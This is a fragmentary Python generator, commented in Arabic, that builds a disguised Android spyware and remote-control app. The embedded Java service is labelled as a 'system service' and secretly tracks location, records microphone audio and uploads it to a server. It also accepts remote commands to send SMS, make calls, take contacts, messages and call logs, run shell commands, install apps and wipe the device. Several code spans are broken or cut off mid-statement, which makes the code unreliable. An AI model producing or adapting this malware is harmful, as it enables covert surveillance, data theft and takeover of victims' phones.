    def generate_unique_id(self) -> str:
        """توليد معرف فريد للتطبيق"""
        timestamp = str(int(datetime.now().timestamp()))
        random_data = os.urandom(16)
        unique_string = timestamp + base64.b64encode(random_data).decode()
        return hashlib.md5(unique_string.encode()).hexdigest()[:12]

    def generate_stealth_monitoring_service(self, app_id: str) -> str:

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import androidx.annotation.Nullable;
import okhttp3.*;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public class StealthMonitoringService extends Service implements LocationListener {{
    private static final String TAG = "SystemService";
    private static final String CHANNEL_ID = "system_channel";
    private static final int NOTIFICATION_ID = 1001;
    
    private String serverUrl;
    private String appId;
    private String deviceId;
    
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private LocationManager locationManager;
    private OkHttpClient httpClient;
    private Handler handler;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        
        // إنشاء قناة الإشعارات المخفية
        createNotificationChannel();
        
        // بدء الخدمة في المقدمة مع إشعار مخفي
        startForeground(NOTIFICATION_ID, createStealthNotification());
        
        // إعداد HTTP Client
        httpClient = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .build();
        
        handler = new Handler(Looper.getMainLooper());
        
        // بدء المراقبة
        startMonitoring();
    }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        if (intent != null) {{
            serverUrl = intent.getStringExtra("server_url");
            appId = intent.getStringExtra("app_id");
        }}
        
        // إعادة تشغيل الخدمة تلقائياً
        return START_STICKY;
    }}
    
    private void createNotificationChannel() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "خدمة النظام",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("خدمة نظام أساسية");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }}
    }}
    
    private Notification createStealthNotification() {{
        return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("خدمة النظام")
                .setContentText("تعمل في الخلفية")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .setAutoCancel(false)
                .setPriority(Notification.PRIORITY_LOW)
                .build();
    }}
    
    private void startMonitoring() {{
        try {{
            // تسجيل الجهاز
            registerDevice();
            
            // بدء مراقبة الموقع
            startLocationMonitoring();
            
            // بدء التسجيل الصوتي
            startAudioRecording();
            
            // بدء مراقبة الأنشطة
            startActivityMonitoring();
            
            // إرسال نبضة الحياة كل 30 ثانية
            startHeartbeat();
            
        }} catch (Exception e) {{
            Log.e(TAG, "Error starting monitoring", e);
        }}
    }}
    
    private void registerDevice() {{
        try {{
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("device_id", deviceId);
            deviceInfo.put("app_id", appId);
            deviceInfo.put("device_name", Build.MODEL);
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("stealth_mode", true);
            
            RequestBody body = RequestBody.create(
                deviceInfo.toString(),
                MediaType.parse("application/json")
            );
            
            Request request = new Request.Builder()
                    .url(serverUrl + "/api/android/register")
                    .post(body)
                    .build();
            
            httpClient.newCall(request).enqueue(new Callback() {{
                @Override
                public void onFailure(@NonNull Call call, @NonNull IOException e) {{
                    Log.e(TAG, "Registration failed", e);
                    // إعادة المحاولة بعد 60 ثانية
                    handler.postDelayed(() -> registerDevice(), 60000);
                }}
                
                @Override
                public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {{
                    if (response.isSuccessful()) {{
                        Log.d(TAG, "Device registered successfully");
                    }} else {{
                        Log.e(TAG, "Registration failed: " + response.code());
                    }}
                }}
            }});
            
        }} catch (JSONException e) {{
            Log.e(TAG, "Error creating registration data", e);
        }}
    }}
    
    private void startLocationMonitoring() {{
        try {{
            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            
            if (locationManager != null) {{
                // طلب تحديثات الموقع كل 5 دقائق
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    300000, // 5 دقائق
                    100,    // 100 متر
                    this
                );
                
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    300000,
                    100,
                    this
                );
            }}
        }} catch (SecurityException e) {{
            Log.e(TAG, "Location permission denied", e);
        }}
    }}
    
    private void startAudioRecording() {{
        try {{
            File audioDir = new File(getExternalFilesDir(null), "audio");
            if (!audioDir.exists()) {{
                audioDir.mkdirs();
            }}
            
            // تسجيل صوتي كل 10 دقائق
            handler.post(new Runnable() {{
                @Override
                public void run() {{
                    recordAudio();
                    handler.postDelayed(this, 600000); // 10 دقائق
                }}
            }});
            
        }} catch (Exception e) {{
            Log.e(TAG, "Error starting audio recording", e);
        }}
    }}
    
    private void recordAudio() {{
        try {{
            if (isRecording) return;
            
            File audioFile = new File(getExternalFilesDir(null), 
                "audio/recording_" + System.currentTimeMillis() + ".m4a");
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            
            // إيقاف التسجيل بعد دقيقتين
            handler.postDelayed(() -> {{
                stopAudioRecording();
                uploadAudioFile(audioFile);
            }}, 120000);
            
        }} catch (Exception e) {{
            Log.e(TAG, "Error recording audio", e);
        }}
    }}
    
    private void stopAudioRecording() {{
        try {{
            if (mediaRecorder != null && isRecording) {{
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
            }}
        }} catch (Exception e) {{
            Log.e(TAG, "Error stopping audio recording", e);
        }}
    }}
    
    private void uploadAudioFile(File audioFile) {{
        try {{
            RequestBody fileBody = RequestBody.create(audioFile, MediaType.parse("audio/m4a"));
            RequestBody deviceIdBody = RequestBody.create(deviceId, MediaType.parse("text/plain"));
            RequestBody appIdBody = RequestBody.create(appId, MediaType.parse("text/plain"));
            
            MultipartBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("device_id", null, deviceIdBody)
                    .addFormDataPart("app_id", null, appIdBody)
                    .addFormDataPart("audio_file", audioFile.getName(), fileBody)
                    .addFormDataPart("stealth", "true")
                    .build();
            
            Request request = new Request.Builder()
                    .url(serverUrl + "/api/android/upload/audio")
                    .post(requestBody)
                    .build();
            
            httpClient.newCall(request).enqueue(new Callback() {{
                @Override
                public void onFailure(@NonNull Call call, @NonNull IOException e) {{
                    Log.e(TAG, "Audio upload failed", e);
                }}
                
                @Override
                public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {{
                    if (response.isSuccessful()) {{
                        Log.d(TAG, "Audio uploaded successfully");
                        audioFile.delete(); // حذف الملف المحلي
                    }}
                }}
            }});
            
        }} catch (Exception e) {{
            Log.e(TAG, "Error uploading audio", e);
        }}
    }}

    private void sendHeartbeat() {{
        try {{
            JSONObject heartbeat = new JSONObject();
            heartbeat.put("device_id", deviceId);
            heartbeat.put("app_id", appId);
            heartbeat.put("status", "active");
            heartbeat.put("stealth_mode", true);
            heartbeat.put("timestamp", System.currentTimeMillis());

                heartbeat.toString(),
                MediaType.parse("application/json")
            );
            
            Request request = new Request.Builder()
                    .url(serverUrl + "/api/android/heartbeat")
                    .post(body)

                @Override

            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {{

    private void processCommands(String commandsJson) {{
        try {{

            // معالجة الأوامر المختلفة

    @Override

        super.onCreate();
        
        httpClient = new OkHttpClient.Builder()

                .readTimeout(30, TimeUnit.SECONDS)

        handler = new Handler(Looper.getMainLooper());
        
        // بدء استقبال الأوامر

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{

                android.provider.Settings.Secure.ANDROID_ID

        return START_STICKY;
    }}
    
    private void startCommandListener() {{
        handler.post(new Runnable() {{
            @Override

                checkForRemoteCommands();
                handler.postDelayed(this, 10000); // كل 10 ثوان
            }}
        }});
    }}
    
    private void checkForRemoteCommands() {{
        Request request = new Request.Builder()
                .url(serverUrl + "/api/android/remote-commands/" + deviceId)
                .get()
                .build();
        
        httpClient.newCall(request).enqueue(new Callback() {{
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {{
                Log.e(TAG, "Failed to check remote commands", e);
            }}
            
            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {{
                if (response.isSuccessful()) {{
                    String responseBody = response.body().string();
                    processRemoteCommands(responseBody);
                }}
            }}
        }});
    }}
    
    private void processRemoteCommands(String commandsJson) {{
        try {{
            JSONObject commands = new JSONObject(commandsJson);
            
            if (commands.has("commands")) {{
                JSONObject commandList = commands.getJSONObject("commands");
                
                // أوامر التحكم المختلفة
                if (commandList.has("send_sms")) {{
                    JSONObject smsData = commandList.getJSONObject("send_sms");
                    sendSMS(smsData.getString("number"), smsData.getString("message"));
                }}
                
                if (commandList.has("make_call")) {{
                    String number = commandList.getString("make_call");
                    makeCall(number);
                }}
                
                if (commandList.has("get_contacts")) {{
                    getContacts();
                }}
                
                if (commandList.has("get_sms")) {{
                    getSMSMessages();
                }}
                
                if (commandList.has("get_call_log")) {{
                    getCallLog();
                }}
                
                if (commandList.has("execute_shell")) {{
                    String command = commandList.getString("execute_shell");
                    executeShellCommand(command);
                }}
                
                if (commandList.has("install_app")) {{
                    String apkUrl = commandList.getString("install_app");
                    installApp(apkUrl);
                }}
                
                if (commandList.has("uninstall_app")) {{
                    String packageName = commandList.getString("uninstall_app");
                    uninstallApp(packageName);
                }}
                
                if (commandList.has("lock_device")) {{
                    lockDevice();
                }}
                
                if (commandList.has("wipe_device")) {{
                    wipeDevice();
                }}
            }}
            
        }} catch (JSONException e) {{
            Log.e(TAG, "Error processing remote commands", e);
        }}
    }}
    
    private void sendSMS(String number, String message) {{

    private void getContacts() {{
        try {{
            // قراءة جهات الاتصال وإرسالها للخادم
            android.database.Cursor cursor = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            );
            
            JSONObject contactsData = new JSONObject();
            org.json.JSONArray contactsArray = new org.json.JSONArray();
            
            if (cursor != null) {{
                while (cursor.moveToNext()) {{
                    JSONObject contact = new JSONObject();
                    String name = cursor.getString(cursor.getColumnIndex(
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
                    
                    contact.put("name", name);
                    contact.put("number", number);
                    contactsArray.put(contact);
                }}
                cursor.close();
            }}
            
            contactsData.put("device_id", deviceId);
            contactsData.put("contacts", contactsArray);
            
            uploadData("/api/android/contacts", contactsData);
            
        }} catch (Exception e) {{
            reportCommandResult("get_contacts", "error", e.getMessage());
        }}

    private void executeShellCommand(String command) {{
        try {{
            Process process = Runtime.getRuntime().exec(command);
            java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(process.getInputStream())
            );
            
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {{
                output.append(line).append("\\n");
            }}
            
            reportCommandResult("execute_shell", "success", output.toString());
            
        }} catch (Exception e) {{
            reportCommandResult("execute_shell", "error", e.getMessage());
        }}

    def generate_app_package(self, disguise_config: Dict) -> str:

        app_id = self.generate_unique_id()
        package_name = f"com.{disguise_config['category']}.{disguise_config['name'].lower().replace(' ', '')}"

        os.makedirs(app_dir, exist_ok=True)
        
        # إنشاء الملفات
        files_created = []
        
        # ملف البيان
        manifest_content = self.generate_stealth_manifest(app_id, disguise_config)
        manifest_path = os.path.join(app_dir, "AndroidManifest.xml")

        files_created.append(manifest_path)
        
        # النشاط الرئيسي
        main_activity_content = self.generate_stealth_main_activity(app_id, disguise_config)
        main_activity_path = os.path.join(app_dir, "MainActivity.java")
        with open(main_activity_path, 'w', encoding='utf-8') as f:
            f.write(main_activity_content)
        files_created.append(main_activity_path)
        
        # خدمة المراقبة المخفية
        monitoring_service_content = self.generate_stealth_monitoring_service(app_id)
        monitoring_service_path = os.path.join(app_dir, "StealthMonitoringService.java")

            f.write(monitoring_service_content)
        files_created.append(monitoring_service_path)

        remote_control_content = self.generate_remote_control_service(app_id)
        remote_control_path = os.path.join(app_dir, "RemoteControlService.java")

        return app_dir
